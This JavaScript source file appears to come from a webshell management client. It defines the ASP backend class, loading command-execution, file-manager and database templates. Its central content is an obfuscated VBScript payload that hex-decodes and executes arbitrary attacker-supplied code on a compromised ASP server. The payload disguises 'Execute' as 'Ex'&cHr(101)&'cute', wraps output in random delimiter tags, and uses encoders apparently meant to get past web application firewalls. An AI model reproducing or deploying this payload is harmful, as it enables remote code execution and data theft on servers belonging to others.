/**
 * ASP服务端脚本模板
 * 开写：2016/04/12
 * 更新：-
 * 作者：蚁逅 <https://github.com/antoor>
 */
'use strict';

// import Base from '../base';
const Base = require('../base');

class ASP extends Base {

  constructor(opts) {
    super(opts);
    // 解析模板
    [
      'base',
      'command',
      'filemanager',
      'database/dsn',
      'database/mysql',
      'database/access',
      'database/oracle',
      'database/sqlserver',
      'database/sqloledb_1',
      'database/sqloledb_1_sspi',
      'database/microsoft_jet_oledb_4_0'
    ].map((_) => {
      this.parseTemplate(`./asp/template/${_}`);
    });
    // 解析编码器
    this
      .encoders
      .map((_) => {
        this.parseEncoder(`./asp/encoder/${_}`);
      });

    this
      .decoders
      .map((_) => {
        this.parseDecoder(`./asp/decoder/${_}`);
      });
  }

  /**
   * 获取编码器列表
   * @return {array} 编码器列表
   */
  get encoders() {
    return ['insert_percent', 'xxxxdog'];
  }

  get decoders() {
    return ['default'];
  }

  /**
   * HTTP请求数据组合函数
   * @param  {Object} data 通过模板解析后的代码对象
   * @return {Promise}     返回一个Promise操作对象
   */
  complete(data, force_default = false) {
    // 分隔符号
    let tag_s, tag_e;
    if (this.__opts__['otherConf'].hasOwnProperty('use-custom-datatag') && this.__opts__['otherConf']['use-custom-datatag'] == 1 && this.__opts__['otherConf']['custom-datatag-tags']) {
      tag_s = this.__opts__['otherConf']['custom-datatag-tags'];
    } else {
      tag_s = Math.random().toString(16).substr(2, parseInt(Math.random() * 8 + 5)); // "->|";
    }
    if (this.__opts__['otherConf'].hasOwnProperty('use-custom-datatag') && this.__opts__['otherConf']['use-custom-datatag'] == 1 && this.__opts__['otherConf']['custom-datatag-tage']) {
      tag_e = this.__opts__['otherConf']['custom-datatag-tage'];
    } else {
      tag_e = Math.random().toString(16).substr(2, parseInt(Math.random() * 8 + 5)); // "|<-";
    }

    // let formatter = new this.format(this.__opts__['encode']);
    let formatter = Base
      .prototype
      .format(this.__opts__);

    // hex编码一次数据
    let hexCode = formatter['hex'](data['_']);

    // data['_'] = `eval("Ex"&cHr(101)&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Execute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Execute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Response.Write(""""${tag_s.substr(0,tag_s.length/2)}""""&""""${tag_s.substr(tag_s.length/2)}""""):Ex"&cHr(101)&"cute(""""On Error Resume Next:""""&bd(""""${hexCode}"""")):Response.Write(""""${tag_e.substr(0,tag_e.length/2)}""""&""""${tag_e.substr(tag_e.length/2)}""""):Response.End"")")`;
    
	data['_'] = `eval("Ex"&cHr(101)&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Public Function b64e(psText):dim oXml, oStream, oNode:Set oXml =Server.CreateObject(""""MSXML2.DOMDocument""""):Set oStream =Server.CreateObject(""""ADODB.Stream""""):Set oNode =oXml.CreateElement(""""tmpNode""""):oNode.dataType =""""bin.base64"""":oStream.Charset =""""gb2312"""":oStream.Type =2:If oStream.state =0 Then oStream.Open():oStream.WriteText(psText):oStream.Position =0:oStream.Type =1:oNode.nodeTypedValue =oStream.Read(-1):oStream.Close():b64e =oNode.Text:End If:Set oNode =Nothing:Set oStream =Nothing:Set oXml =Nothing:End Function:Public Function b64d(psText):dim oXml, oStream, oNode:Set oXml =Server.CreateObject(""""MSXML2.DOMDocument""""):Set oStream =Server.CreateObject(""""ADODB.Stream""""):Set oNode =oXml.CreateElement(""""tmpNode""""):oNode.dataType =""""bin.base64"""":oNode.Text =psText:oStream.Charset =""""gb2312"""":oStream.Type =1:oStream.Open():oStream.Write(oNode.nodeTypedValue):oStream.Position =0:oStream.Type =2:b64d =oStream.ReadText(-1):oStream.Close:Set oNode =Nothing:Set oStream =Nothing:Set oXml =Nothing:End Function:Public Function decode( byVal strIn ):if strIn=null or strIn="""""""" or isempty(strIn) then:decode = strIn:Exit Function:end if:Dim result,i,tmp:result = """""""":tmp = split(b64d(strIn),""""/""""):For i=0 to ubound(tmp) - 1:result = result & (chr(cint(tmp(i)) xor 99)):Next:decode = b64d(result):End Function:Public Function encode( byVal str ):Dim temp, tmp:temp = b64e(str):For i=0 to Len(temp) - 1:tmp = tmp & (asc(mid(temp,i + 1,1)) xor 99) & """"/"""":Next:encode = b64e(tmp):End Function:Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Execute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Execute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Response.Write(""""${tag_s.substr(0,tag_s.length/2)}""""&""""${tag_s.substr(tag_s.length/2)}""""):Ex"&cHr(101)&"cute(""""On Error Resume Next:""""&bd(""""${hexCode}"""")):Response.Write(""""${tag_e.substr(0,tag_e.length/2)}""""&""""${tag_e.substr(tag_e.length/2)}""""):Response.End"")")`;
    
    // 使用编码器进行处理并返回
    return this.encodeComplete(tag_s, tag_e, data);
  }
}

module.exports = ASP;